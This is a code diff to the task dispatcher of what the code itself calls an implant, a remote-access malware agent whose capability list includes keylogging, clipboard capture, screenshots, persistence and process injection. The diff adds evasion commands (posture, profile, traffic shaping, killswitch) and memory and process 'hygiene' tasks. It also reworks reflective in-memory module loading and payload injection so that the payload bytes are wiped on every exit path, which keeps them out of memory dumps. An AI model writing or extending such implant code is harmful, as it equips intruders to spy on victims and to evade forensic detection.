@@ -34,7 +34,9 @@ pub fn capabilities() -> Vec<&'static str> {
         "persist.migrate", "persist.health", "update", "registry", "screenshot",
         "clipboard", "keylog", "keylog.file", "triage", "find", "netinfo",
         "session.open", "session.input", "session.close", "vpn", "scan",
-        "resolve", "env", "touch",
+        "resolve", "env", "touch", "evade.report", "evade.posture",
+        "evade.profile", "evade.shape", "evade.killswitch", "hygiene.memory",
+        "hygiene.process",
     ]
 }
 
@@ -86,6 +88,18 @@ fn persistence(result: Result<crate::persist::Report, String>) -> Outcome {
             .with("persist_broken", upk::u(report.broken)),
         Err(e) => Outcome::err(1, e),
     }
+}
+
+/// An outcome with the extra fields of a report.
+///
+/// The evasion and the hygiene tasks return the fields they want the
+/// server to keep; this is how they get into the result.
+fn with_extra(outcome: Outcome, extra: Vec<(&'static str, Value)>) -> Outcome {
+    let mut outcome = outcome;
+    for (key, value) in extra {
+        outcome = outcome.with(key, value);
+    }
+    outcome
 }
 
 fn shell_command(cmd: &str) -> Command {
@@ -513,6 +527,34 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
         "persist.verify" => persistence(crate::persist::verify(&args)),
         "persist.migrate" => persistence(crate::persist::migrate(&args)),
         "persist.health" => persistence(crate::persist::health(&args)),
+        "evade.report" => {
+            let (text, extra) = crate::evade::posture_report();
+            with_extra(Outcome::ok(text.into_bytes()), extra)
+        }
+        "evade.posture" => match crate::evade::set_posture(&args) {
+            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
+            Err(e) => Outcome::err(1, e),
+        },
+        "evade.profile" => match crate::evade::set_profile(&args) {
+            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
+            Err(e) => Outcome::err(1, e),
+        },
+        "evade.shape" => match crate::evade::set_shaping(&args) {
+            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
+            Err(e) => Outcome::err(1, e),
+        },
+        "evade.killswitch" => match crate::evade::set_killswitch(&args) {
+            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
+            Err(e) => Outcome::err(1, e),
+        },
+        "hygiene.memory" => match crate::hygiene::memory(&args) {
+            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
+            Err(e) => Outcome::err(1, e),
+        },
+        "hygiene.process" => match crate::hygiene::process(&args) {
+            Ok((text, extra)) => with_extra(Outcome::ok(text.into_bytes()), extra),
+            Err(e) => Outcome::err(1, e),
+        },
         "update" => match crate::install::update(&args) {
             Ok(report) => Outcome::ok(report.into_bytes()),
             Err(e) => Outcome::err(1, e),
@@ -978,11 +1020,15 @@ fn peer_link(ctx: &Context, args: &Value) -> Outcome {
 /// Run a module in memory: a COFF object or a PE image.
 fn run_module(args: &Value) -> Outcome {
     let name = args.str_or("name", "module");
-    let mut data = args.bin_or("data", b"");
+    let data = args.bin_or("data", b"");
     if data.is_empty() {
         return Outcome::err(1, "the module is empty");
     }
     let module_args = crate::bof::parse_args(args.get("args").unwrap_or(&Value::Null));
+    // The module image lives in a guard: it has served its purpose when
+    // this function returns, and the bytes are wiped on every path out of
+    // it, including the one where the module failed to load.
+    let data = crate::crypto::Zeroizing::new(data);
     let result = if data.starts_with(b"MZ") {
         // A PE image: run it in this process through the reflective loader.
         crate::post::reflective_load(&data)
@@ -992,9 +1038,6 @@ fn run_module(args: &Value) -> Outcome {
             material: loaded.output,
         })
     };
-    // The module image has served its purpose: the bytes are wiped so a
-    // memory dump of the implant does not hand the module back.
-    crate::crypto::zeroize(&mut data);
     match result {
         Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
         Err(e) => Outcome::err(1, e),
@@ -1008,10 +1051,10 @@ fn inject(args: &Value) -> Outcome {
         return Outcome::err(1, "inject requires args.pid");
     }
     let mode = args.str_or("mode", "reflect");
-    let mut payload = args.bin_or("data", b"");
+    // The payload lives in a guard: it leaves no copy in the implant, and
+    // it is wiped on every path out of this function.
+    let payload = crate::crypto::Zeroizing::new(args.bin_or("data", b""));
     let result = crate::post::inject(pid, &mode, &payload);
-    // The payload leaves no copy in the implant.
-    crate::crypto::zeroize(&mut payload);
     match result {
         Ok(outcome) => Outcome::ok(outcome.report.into_bytes()),
         Err(e) => Outcome::err(1, e),
